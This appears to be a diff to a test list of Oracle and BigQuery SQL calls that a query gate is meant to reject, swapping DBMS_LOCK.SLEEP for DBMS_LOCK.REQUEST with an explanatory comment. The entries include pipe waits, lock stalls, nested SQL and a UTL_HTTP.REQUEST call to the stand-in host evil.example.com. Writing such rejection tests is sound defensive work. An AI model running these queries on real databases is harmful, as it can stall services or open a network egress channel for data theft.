@@ -471,7 +471,10 @@ REJECT_DIALECT_SIDE_EFFECT_FUNCTIONS = [
     # ----- BigQuery — federated remote SQL -----
     "SELECT x FROM EXTERNAL_QUERY('conn', 'SELECT 1')",
     # ----- Oracle — package-qualified sleep, pipes, nested SQL and network egress -----
-    "SELECT DBMS_LOCK.SLEEP(5) FROM dual",
+    # `DBMS_LOCK.REQUEST` and `DBMS_PIPE.RECEIVE_MESSAGE` are FUNCTIONS, so these are call
+    # shapes Oracle actually accepts in a bare SELECT. `DBMS_LOCK.SLEEP` is a procedure and is
+    # not spelled here for that reason — it needs a PL/SQL block this gate never sees.
+    "SELECT DBMS_LOCK.REQUEST(1, 6, 10, TRUE) FROM dual",
     "SELECT DBMS_PIPE.RECEIVE_MESSAGE('p', 10) FROM dual",
     "SELECT DBMS_XMLGEN.GETXML('SELECT 1 FROM dual') FROM dual",
     "SELECT UTL_HTTP.REQUEST('http://evil.example.com') FROM dual",
